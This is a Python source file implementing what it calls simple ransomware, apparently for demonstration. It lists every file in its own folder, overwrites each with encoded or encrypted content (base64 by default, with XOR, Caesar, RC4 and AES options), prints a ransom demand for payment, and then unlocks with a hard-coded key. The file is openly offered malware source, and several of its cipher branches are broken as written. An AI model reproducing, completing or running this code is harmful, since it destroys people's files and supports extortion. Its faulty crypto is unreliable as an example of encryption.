#!/usr/bin/env python3

""" Implementation of simple ransomware in Python.
"""

import logging
import os
from itertools import  cycle
import sys
import base64
import random
from Crypto.Cipher import ARC4
from Crypto.Cipher import AES


class Ransomware:
    """ This class represents file encrypting ransomware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        """ Key used for encryption of data. """
        return "__ransomware_key"

    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")

    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print(
            "Hi, all your files has been encrypted. Please "
            "send 0.1 USD on this address to get decryption"
            " key: XYZ."
        )

    def encrypt_file(self, filename, algorithm):
        key="__ransomware_key"
        # Load the content of file.
        with open(filename, 'r') as file:
            content = file.read()

        if algorithm ==1:
            # Encrypt the file content with base64.
            encrypted_data = base64.b64encode(content.encode('utf-8'))
        
        if algorithm ==2:
            # Encrypt the file content with xor.
            encrypted_data = base64.b64encode(content.encode('utf-8'))
            encrypted_data = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(encrypted_data, cycle(key)))

        if algorithm ==3:
            # Encrypt the file content with caesar.
            encrypted_data = bytes([(b + 3) % 256 for b in content])

        if algorithm ==4:
            cipher = ARC4.new(self.key.encode('utf-8'))
            # Encrypt the file content with RC4.
            encrypted_data = cipher.encrypt(content)

        if algorithm ==5:
            cipher = AES.new(self.key.encode('utf-8'), AES.MODE_EAX)
            # Encrypt the file content with AES.
            encrypted_data, tag = cipher.encrypt_and_digest(content)
        
        # Rewrite the file with the encoded content.
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))

    def decrypt_file(self, key, filename,algorithm):
        
        # Load the content of file.
        with open(filename, 'r') as file:
            content = file.read()
        if algorithm ==1:
            # Decrypt the file content.
            decrypted_data = base64.b64decode(content)

        if algorithm ==2:
            # Decrypt the file content.
            decrypted_data = base64.b64decode(content)
            decrypted_data = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(decrypted_data, cycle(key)))

        if algorithm ==3:
            # Decrypt the file content.
            decrypted_data = bytes([(b - 3) % 256 for b in content])

        if algorithm ==4:
            # Create an instance of the RC4 cipher object.
            cipher = ARC4.new(key.encode('utf-8'))
            # Decrypt the file content.
            decrypted_data = cipher.decrypt(content)

        if algorithm ==5:
            cipher = AES.new(key.encode('utf-8'), AES.MODE_EAX)
            # Decrypt the file content.
            decrypted_data = cipher.decrypt_and_verify(content)

        # Rewrite the file with the encoded content.
        with open(filename, 'w') as file:
            content = file.write(decrypted_data.decode('utf-8'))

    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.

        :param str path: Path to the folder
        """
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository and this file.
            if file == 'README.md' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_files_in_folder(self, path,algo):
        """ Encrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be encrypted.
        :returns: Number of encrypted files (`int`).
        """
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        # Encrypt each file in the directory.
        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file,algo)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path,algo):
        """ Decrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be decrypted.
        """
        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)

        # Decrypt each file in the directory.
        for file in files:
            self.decrypt_file(key, file,algo)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create ransomware.
    ransomware = Ransomware('SimpleRansomware')

    #algo = random.randint(1, 1000)%5
    algo=1

    if algo == 1:
        print("Using Base64 Encryption")
    elif algo == 2:
        print("Using XOR Encryption")
    elif algo == 3:
        print("Using Caesar Encryption")
    elif algo == 4:
        print("Using RC4 Encryption")
    elif algo == 5:
        print("Using AES Encryption")
    


    # Encrypt files located in the same folder as our ransomware.
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = ransomware.encrypt_files_in_folder(path,algo=algo)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    ransomware.decrypt_files_in_folder(path,algo=algo)